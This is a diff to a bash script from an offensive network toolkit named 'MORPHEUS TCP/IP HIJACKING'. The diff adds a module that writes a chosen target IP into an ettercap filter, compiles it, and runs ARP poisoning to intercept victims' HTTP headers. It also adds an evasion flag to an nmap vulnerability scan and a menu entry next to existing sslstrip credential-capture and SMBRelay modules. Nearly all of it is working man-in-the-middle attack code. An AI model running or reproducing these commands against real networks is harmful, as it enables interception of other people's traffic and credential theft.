@@ -2907,7 +2907,86 @@ fi
 
 
 
+# ----------------------------------------
+# tcp http header infomation gather
+# ----------------------------------------
+sh_stage22 () {
 
+echo ""
+echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
+echo "${BlueF}    | ${YellowF}This module capture sellected 'device' tcp http headers requests. ${BlueF}|"
+echo "${BlueF}    | ${YellowF}to gather information about target system browser settings.       ${BlueF}|"
+echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
+echo ""
+sleep 2
+
+# run module?
+rUn=$(zenity --question --title="☠ MORPHEUS TCP/IP HIJACKING ☠" --text "[ http tcp header information gathering ]\nExecute this module?" --width 300) > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+
+
+# get user input to build filter
+echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+sleep 1
+cp $IPATH/filters/IG.eft $IPATH/filters/IG.bak > /dev/null 2>&1
+rhost=$(zenity --title="☠ DEVICE TO FILTER ☠" --text "example: $IP\nchose remote target to filter through morpheus." --entry --width 270) > /dev/null 2>&1
+# write taget ip addr in ip.mop so IG.sh can use it ..
+echo "target:$rhost" > $IPATH/output/ip.mop
+
+
+  cd $IPATH/filters
+  # replace values in template.filter with sed bash command
+  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
+  sed -i "s|TaRgEt|$rhost|g" IG.eft
+  cd $IPATH
+  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter\nOR to scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
+  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/IG.eft"
+  sleep 1
+
+    # compiling firewall.eft to be used in ettercap
+    echo ${BlueF}[☠]${white} Compiling IG.eft${RedF}!${Reset};
+    xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/IG.eft -o $IPATH/output/IG.ef && sleep 3"
+    sleep 1
+    cd $IPATH/logs
+
+      # run mitm+filter
+      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
+      echo ${YellowF}[☠]${white} Press ${YellowF}[q]${white} to quit ettercap framework${RedF}!${Reset};   
+      sleep 2
+      if [ "$IpV" = "ACTIVE" ]; then
+        if [ "$LoGs" = "NO" ]; then
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        xterm -T "MORPHEUS - http tcp header information gathering" -geometry 109x27 -e "cd $IPATH/bin && ./IG.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/IG.ef -M ARP /// ///
+        else
+        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
+        xterm -T "MORPHEUS - http tcp header information gathering" -geometry 109x27 -e "cd $IPATH/bin && ./IG.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/IG.ef -L $IPATH/logs/IG.log -M ARP /// ///
+        fi
+
+      else
+
+        if [ "$LoGs" = "YES" ]; then
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        xterm -T "MORPHEUS - http tcp header information gathering" -geometry 109x27 -e "cd $IPATH/bin && ./IG.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/IG.ef -M ARP // //
+        else
+        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
+        xterm -T "MORPHEUS - http tcp header information gathering" -geometry 109x27 -e "cd $IPATH/bin && ./IG.sh" & ettercap -T -Q -i $InT3R -F $IPATH/output/IG.ef -L $IPATH/logs/IG.log -M ARP // //
+        fi
+      fi
+
+
+  # clean up
+  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
+  sleep 2
+  mv $IPATH/filters/IG.bak $IPATH/filters/IG.eft > /dev/null 2>&1
+  rm $IPATH/output/ip.mop > /dev/null 2>&1
+  rm $IPATH/output/IG.ef > /dev/null 2>&1
+  cd $IPATH
+
+else
+  echo ${RedF}[x]${white} Abort current tasks${RedF}!${Reset};
+  sleep 2
+fi
+}
 
 
 
@@ -2992,7 +3071,7 @@ fi
   else
 
     target=$(zenity --title="☠ Enter  RHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
-    nmap -sS -Pn --reason -oN $IPATH/logs/lan.mop --script vuln $target | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning: $target [ NSE ] .." --percentage=0 --auto-close --width 320 > /dev/null 2>&1
+    nmap -sS -Pn --reason --data-length 25 -oN $IPATH/logs/lan.mop --script vuln $target | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="[ $dtr ] Scanning: $target [ NSE ] .." --percentage=0 --auto-close --width 320 > /dev/null 2>&1
     # strip results and print report
     cat $IPATH/logs/lan.mop | grep -v "Not" | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 590 --height 470 > /dev/null 2>&1
   fi
@@ -3089,6 +3168,7 @@ cat << !
     |  19    -  Redirect browser traffic        -  to google pranks     |
     |  20    -  Capture https credentials       -  sslstrip+dns2proxy   |
     |  21    -  SMBrelay lateral movement       -  C&C SMBRelay exploit |
+    |  22    -  tcp header information gather   -  capture http headers |
     |                                                                   |
     |   W    -  Write your own filter                                   |
     |   S    -  Scan LAN for live hosts                                 |
@@ -3123,6 +3203,7 @@ case $choice in
 19) sh_stage19 ;;
 20) sh_stage20 ;;
 21) sh_stage21 ;;
+22) sh_stage22 ;;
 W) sh_stageW ;;
 w) sh_stageW ;;
 S) sh_stageS ;;
